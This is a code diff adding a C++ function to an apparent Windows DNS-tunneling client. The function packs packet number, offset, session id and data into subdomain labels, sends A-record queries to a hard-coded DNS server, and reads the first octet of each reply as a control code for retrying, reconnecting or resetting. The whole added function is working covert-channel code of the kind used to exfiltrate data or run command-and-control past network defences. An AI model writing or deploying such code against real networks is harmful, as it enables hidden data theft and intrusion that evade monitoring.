@@ -6,6 +6,7 @@
 #include <string>
 #include <sstream>
 #include <iomanip>
+#include <vector>
 #include <winsock2.h>
 #include <windns.h>
 
@@ -249,6 +250,99 @@ int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain
 		}
 	return retCode;
 }
+
+int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain, const char* data)
+{
+	if (!domain || !data) {
+		return -1;
+	}
+
+	std::ostringstream fullStream;
+	fullStream << "p." << packetNumber << "." << offset << "." << id << "." << data << "." << domain;
+	std::string full = fullStream.str();
+	const char* pOwnerName = full.c_str();
+	
+	WORD wType = DNS_TYPE_A; // 16
+	PDNS_RECORD pDnsRecord = nullptr;
+	
+	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
+	if (!pSrvList) {
+		return -1;
+	}
+
+	pSrvList->AddrCount = 1;
+	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
+	
+	DNS_STATUS status;
+	int retCode = -1;
+	
+	for (int i = 0; i < 3; i++) {
+		pDnsRecord = nullptr;
+		
+		status = DnsQuery_A(
+			pOwnerName,
+			wType,
+			DNS_OPTIONS,
+			pSrvList,
+			&pDnsRecord,
+			nullptr
+		);
+		
+		
+		if (!status && pDnsRecord) {
+			IN_ADDR ipaddr;
+			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
+			std::string ipStr = inet_ntoa(ipaddr);
+			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
+			
+			size_t firstDot = ipStr.find(".");
+			if (firstDot == std::string::npos) {
+				goto cleanup;
+			}
+			
+			int code = std::stoi(ipStr.substr(0, firstDot));
+			
+			switch (code) {
+			case 200:  
+				retCode = 0;
+				goto cleanup;
+					
+			case 201:  
+				break;
+					
+			case 202: 
+				{
+					int new_id = startConnection(domain);
+					if (new_id != -1) {
+						id = new_id;
+					}
+				}
+				i--;  
+				break;
+					
+			case 203:  
+				packetNumber = 0;
+				i--;  
+				break;
+					
+			case 204: 
+				goto cleanup;
+					
+			default:
+				goto cleanup;
+			}
+		}
+		
+		Sleep(200); 
+	}
+	
+	cleanup:
+		if (pSrvList) {
+			LocalFree(pSrvList);
+		}
+	return retCode;
+}
+
 
 std::string convertToHex(const char* string) {
 	if (!string) {
